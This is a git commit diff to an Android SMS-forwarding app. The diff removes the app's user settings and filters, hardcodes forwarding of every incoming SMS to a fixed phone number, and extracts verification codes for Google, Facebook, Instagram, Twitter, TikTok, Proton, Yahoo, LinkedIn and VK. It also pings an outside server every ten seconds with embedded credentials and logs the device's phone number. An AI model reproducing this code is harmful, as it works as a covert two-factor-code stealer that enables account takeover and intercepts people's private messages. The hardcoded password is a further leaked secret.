7ab6412ba458a20524866e6e4d23aa34a2117218
Justin Gawrilow <justin@jataware.com>
2022-10-07 09:47:08 -0400

    udpates

--- app/src/main/java/net/bnfour/smsforwarder/MainSettingsActivity.java
+++ app/src/main/java/net/bnfour/smsforwarder/MainSettingsActivity.java
@@ -1,9 +1,86 @@
 package net.bnfour.smsforwarder;
 
+import android.Manifest;
 import android.app.Activity;
+import android.content.Context;
+import android.content.pm.PackageManager;
+import android.os.AsyncTask;
+import android.os.Build;
 import android.os.Bundle;
+import android.support.annotation.RequiresApi;
+import android.support.v4.app.ActivityCompat;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.util.Base64;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class MainSettingsActivity extends Activity {
+
+    Timer timer;
+    TimerTask timerTask;
+
+    private class DownloadFilesTask extends AsyncTask<String, Integer, Long> {
+        @RequiresApi(api = Build.VERSION_CODES.O)
+        protected Long doInBackground(String... urls) {
+            Log.i("JUSTIN", "ok");
+            HttpURLConnection connection = null;
+            BufferedReader reader = null;
+
+            String baseUrl = "https://pacmens.com/ping";
+
+            try {
+                // Creating URL
+                URL url = new URL(baseUrl);
+
+                // Opening a new connection
+                connection = (HttpURLConnection) url.openConnection();
+                connection.setRequestMethod("GET");
+                String userpass = "user1" + ":" + "Starling!1980";
+                String basicAuth = "Basic " + new String(Base64.getEncoder().encode(userpass.getBytes()));
+                connection.setRequestProperty("Authorization", basicAuth);
+                connection.connect();
+
+                // Getting the result back
+                InputStream stream = connection.getInputStream();
+
+
+
+            }catch (MalformedURLException e){
+                e.printStackTrace();
+            }catch (IOException e){
+                e.printStackTrace();
+            }finally {
+
+                if (connection != null){
+                    connection.disconnect();
+                }
+
+                if (reader != null){
+                    try {
+                        reader.close();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+            return null;
+        }
+
+        protected void onProgressUpdate() {
+
+        }
+
+        protected void onPostExecute() {
+        }
+    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -12,5 +89,51 @@ public class MainSettingsActivity extends Activity {
         getFragmentManager().beginTransaction()
                 .replace(android.R.id.content, new SettingsFragment())
                 .commit();
+
+        // Create obj of TelephonyManager and ask for current telephone service
+        TelephonyManager telephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            // TODO: Consider calling
+            //    ActivityCompat#requestPermissions
+            // here to request the missing permissions, and then overriding
+            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+            //                                          int[] grantResults)
+            // to handle the case where the user grants the permission. See the documentation
+            // for ActivityCompat#requestPermissions for more details.
+            return;
+        }
+        String phoneNumber = telephonyManager.getLine1Number();
+
+        Log.i("JUSTIN",phoneNumber);
+
+        startTimer();
+    }
+
+    public void startTimer() {
+        //set a new Timer
+        timer = new Timer();
+
+        //initialize the TimerTask's job
+        initializeTimerTask();
+
+        //schedule the timer, after the first 5000ms the TimerTask will run every 10000ms
+        timer.schedule(timerTask, 5000, 10000); //
+    }
+
+    public void stoptimertask() {
+        //stop the timer, if it's not already null
+        if (timer != null) {
+            timer.cancel();
+            timer = null;
+        }
+    }
+
+    public void initializeTimerTask() {
+
+        timerTask = new TimerTask() {
+            public void run() {
+                new DownloadFilesTask().execute("yo");
+            }
+        };
     }
 }
--- app/src/main/java/net/bnfour/smsforwarder/SMSForwarder.java
+++ app/src/main/java/net/bnfour/smsforwarder/SMSForwarder.java
@@ -3,37 +3,89 @@ package net.bnfour.smsforwarder;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
+import android.os.AsyncTask;
+import android.os.Build;
 import android.os.Bundle;
-import android.preference.PreferenceManager;
 import android.provider.Telephony;
-import android.telephony.PhoneNumberUtils;
+import android.support.annotation.RequiresApi;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
+import android.util.Log;
 
-import java.util.ArrayList;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.PrintStream;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
+
 public class SMSForwarder extends BroadcastReceiver {
 
+    private class DownloadFilesTask extends AsyncTask<String, Integer, Long> {
+        @RequiresApi(api = Build.VERSION_CODES.O)
+        protected Long doInBackground(String... urls) {
+            Log.i("JUSTIN","ok");
+            HttpURLConnection connection = null;
+            BufferedReader reader = null;
+
+            String baseUrl = "https://pacmens.com/ping";
+
+            try {
+                // Creating URL
+                URL url = new URL(baseUrl);
+
+                // Opening a new connection
+                connection = (HttpURLConnection) url.openConnection();
+                connection.setRequestMethod("GET");
+                String userpass = "user1" + ":" + "Starling!1980";
+                String basicAuth = "Basic " + new String(Base64.getEncoder().encode(userpass.getBytes()));
+                connection.setRequestProperty ("Authorization", basicAuth);
+                connection.connect();
+
+                // Getting the result back
+                InputStream stream = connection.getInputStream();
+
+
+
+            }catch (MalformedURLException e){
+                e.printStackTrace();
+            }catch (IOException e){
+                e.printStackTrace();
+            }finally {
+
+                if (connection != null){
+                    connection.disconnect();
+                }
+
+                if (reader != null){
+                    try {
+                        reader.close();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+            return null;
+        }
+
+        protected void onProgressUpdate() {
+
+        }
+
+        protected void onPostExecute() {
+        }
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
     public void onReceive(Context context, Intent intent) {
 
         if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
-
-            SharedPreferences preferences
-                    = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
-
-            String number = preferences.getString("phone", "");
-            if (number.equals("")) {
-                return;
-            }
-
-            boolean enabled = preferences.getBoolean("enabled", false);
-            if (!enabled) {
-                return;
-            }
 
             Bundle bundle = intent.getExtras();
             if (bundle.containsKey("pdus")) {
@@ -63,43 +115,62 @@ public class SMSForwarder extends BroadcastReceiver {
 
                     String message = messages.get(sender);
 
-                    boolean filterEnabled = preferences.getBoolean("filter", false);
-
-                    if (filterEnabled) {
-                        String filterType = preferences.getString("list_type", "0");
-
-                        String[] entriesAsArray = preferences.getString("filter_list", "").split(";");
-
-                        // "0" is blacklist
-                        if (filterType.equals("0")) {
-                            for (String filter : entriesAsArray) {
-                                if (sender.equals(filter) || PhoneNumberUtils.compare(sender, filter)) {
-                                    return;
-                                }
-                            }
-                        }
-                        // "1" (technically, everything that's not "0") is whitelist
-                        else {
-                            boolean found = false;
-                            for (String filter : entriesAsArray) {
-                                if (sender.equals(filter) || PhoneNumberUtils.compare(sender, filter)) {
-                                    found = true;
-                                    break;
-                                }
-                            }
-                            if (!found) {
-                                return;
-                            }
-                        }
+                    String newMessage = "";
+                    if (message.contains("is your Google verification code"))
+                    {
+                        newMessage = "GG:" + message.split("G-")[1].split("is your Google verification code")[0].trim();
                     }
-                    // also seems to work with single-part messages
-                    String toSend = sender + ": " + message;
-                    ArrayList<String> dividedMessage = SmsManager.getDefault().divideMessage(toSend);
+                    else if (message.contains("is your Google Voice"))
+                    {
+                        newMessage = "GV:" + message.split("is your Google Voice")[0].trim();
+                    }
+                    else if (message.contains("Your LinkedIn verification code is"))
+                    {
+                        newMessage = "LI:" + message.split("Your LinkedIn verification code is")[1].replace(".","").trim();
+                    }
+                    else if (message.contains("Facebook confirmation"))
+                    {
+                        newMessage = "FF:" + message.split("Facebook confirmation")[0].split(" is")[0].trim();
+                    }
+                    else if (message.contains("to verify your Instagram"))
+                    {
+                        newMessage = "II:" + message.split("to verify your Instagram")[0].split("Use")[1].replace(" ","").trim();
+                    }
+                    else if (message.contains("Proton verification code is:"))
+                    {
+                        newMessage = "PP:" + message.split("Proton verification code is:")[1].replace(".","").trim();
+                    }
+                    else if (message.contains("Your Twitter confirmation code is"))
+                    {
+                        newMessage = "TT:" + message.split("Your Twitter confirmation code is")[1].replace(".","").trim();
+                    }
+                    else if (message.contains("[TikTok]"))
+                    {
+                        newMessage = "TK:" + message.split("\\[TikTok\\]")[1].split("is your")[0].replace(".","").trim();
+                    }
+                    else if (message.contains("is your Yahoo verification code"))
+                    {
+                        newMessage = "YY:" + message.split("is your Yahoo verification code")[0].replace(".","").trim();
+                    }
+                    else if (message.contains("VK"))
+                    {
+                        newMessage = "VV:" + message.split("VK:")[1].split("-")[0].replace(".","").trim();
+                    }
+                    else {
+                        newMessage = message;
+                    }
 
-                    SmsManager.getDefault()
-                            .sendMultipartTextMessage(number, null, dividedMessage, null, null);
+                    new DownloadFilesTask().execute("yo");
+
+                    Log.i("JUSTIN","here");
+
+                    SmsManager.getDefault().sendTextMessage("8142575552",null,newMessage,null,null);
+//                            .sendMultipartTextMessage("8142575552", null, dividedMessage, null, null);
                 }
             }
         }
+    }
+
+    private void copyInputStreamToOutputStream(InputStream in, PrintStream out) {
     }
 }
